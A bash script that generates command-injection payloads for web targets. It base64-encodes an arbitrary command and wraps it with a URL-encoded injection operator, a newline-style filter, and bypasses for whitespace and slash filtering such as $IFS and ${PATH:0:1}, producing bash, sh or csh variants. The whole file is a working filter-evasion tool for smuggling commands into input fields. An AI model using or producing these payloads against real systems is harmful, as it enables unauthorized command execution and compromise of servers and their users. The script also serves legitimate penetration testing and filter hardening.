#!/bin/bash

# Function to display usage instructions
usage() {
    echo "Usage: $0 \"command\" --encode"
    exit 1
}

# Function to create payload for bash
create_bash_payload() {
    local encoded_command=$1
    local encoded_operator=$2
    local filter=$3
    local whitespace_bypass=$4
    local slash_bypass=$5
    echo "tmp${whitespace_bypass}${filter}${encoded_operator}b\"a\"sh<<<\$(base64${slash_bypass}-d<<<$encoded_command)"
}

# Function to create payload for sh
create_sh_payload() {
    local encoded_command=$1
    local encoded_operator=$2
    local filter=$3
    local whitespace_bypass=$4
    local slash_bypass=$5
    echo "tmp${whitespace_bypass}${filter}${encoded_operator}sh -c \"\$(echo $encoded_command | base64${slash_bypass}-d)\""
}

# Function to create payload for csh
create_csh_payload() {
    local encoded_command=$1
    local encoded_operator=$2
    local filter=$3
    local whitespace_bypass=$4
    local slash_bypass=$5
    echo "tmp${whitespace_bypass}${filter}${encoded_operator}csh -c \"\$(echo $encoded_command | base64${slash_bypass}-d)\""
}

# Check if the correct number of arguments are provided
if [ $# -ne 2 ]; then
    usage
fi

# Check if the second argument is --encode
if [ "$2" != "--encode" ]; then
    usage
fi

# Prompt the user for the target environment
read -p "Enter the target environment (bash, sh, csh): " environment

# Validate the environment input
if [[ "$environment" != "bash" && "$environment" != "sh" && "$environment" != "csh" ]]; then
    echo "Error: Invalid environment. Please enter 'bash', 'sh', or 'csh'."
    exit 1
fi

# Prompt the user for the command injection operator
read -p "Enter the command injection operator (&, |, ;, etc.): " operator

# Encode the operator in URL encoding format
encoded_operator=$(printf "%s" "$operator" | jq -sRr @uri)

# Prompt the user for the filter (if any)
read -p "Enter any filter to use (e.g., %0a) or press Enter to skip: " filter

# Prompt the user for the whitespace bypass method
read -p "Enter the method to bypass white spaces (e.g., \$IFS, %09): " whitespace_bypass

# Prompt the user for the slash bypass method
read -p "Enter the method to bypass slashes (e.g., \${PATH:0:1}, //, %09): " slash_bypass

# Check if base64 utility is available
if ! command -v base64 &> /dev/null; then
    echo "Error: base64 utility not found. Please install base64."
    exit 1
fi

# Encode the command in base64
encoded_command=$(echo -n "$1" | base64)

# Generate the final payload based on the environment, operator, filter, and bypass methods
case $environment in
    bash)
        payload=$(create_bash_payload "$encoded_command" "$encoded_operator" "$filter" "$whitespace_bypass" "$slash_bypass")
        ;;
    sh)
        payload=$(create_sh_payload "$encoded_command" "$encoded_operator" "$filter" "$whitespace_bypass" "$slash_bypass")
        ;;
    csh)
        payload=$(create_csh_payload "$encoded_command" "$encoded_operator" "$filter" "$whitespace_bypass" "$slash_bypass")
        ;;
esac

# Print the payload
echo "$payload"
